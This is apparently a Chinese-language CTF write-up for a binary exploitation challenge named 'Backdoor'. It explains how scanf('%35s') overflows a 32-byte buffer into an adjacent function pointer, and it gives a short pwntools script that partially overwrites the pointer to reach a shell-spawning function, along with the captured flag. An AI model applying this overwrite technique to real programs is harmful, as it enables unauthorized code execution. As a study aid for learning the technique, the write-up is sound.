# Backdoor

## 题目简述

程序把 32 字节输入缓冲区和函数指针连续放在结构体中，随后使用 `%35s` 读入数据并调用该指针。二进制没有 PIE，因而可以通过短溢出把默认的 `no_backdoor` 指针部分改写为固定地址的 `backdoor`。

## 解题过程

漏洞位置很直接：

```c
struct Data {
    char buf[0x20];
    void (*func_ptr)();
};

d.func_ptr = no_backdoor;
scanf("%35s", d.buf);
d.func_ptr();
```

`buf` 结束后紧接着就是 `func_ptr`。两个函数都位于同一非 PIE 映像的 `0x400000` 地址范围，高位字节相同，只需要把指针最低三字节换成 `backdoor` 的低三字节。`scanf` 随后写入的字符串终止符会落在第四字节，而该字节本来就是 `0x00`，不会破坏地址。

核心利用只有一行载荷：

```python
from pwn import *

elf = context.binary = ELF("./backdoor")
io = process(elf.path)
payload = b"A" * 0x20 + p64(elf.sym.backdoor)[:3]
io.send(payload)
io.sendline(b"cat flag.txt")
print(io.recvline_contains(b"grey{").decode())
```

函数指针被调用后进入 `backdoor`，执行 `/bin/sh`，可读取：

```text
grey{overwriting_function_pointers_in_2026?!?!?!}
```

## 方法总结

这是一道结构体相邻字段覆盖题。关键不是覆盖完整的 8 字节地址，而是利用非 PIE 映像中函数地址共享高位的特点做部分覆盖。计算载荷时还要把输入函数自动追加的 `\0` 算进去，确认它落到的字节原本就应为零。
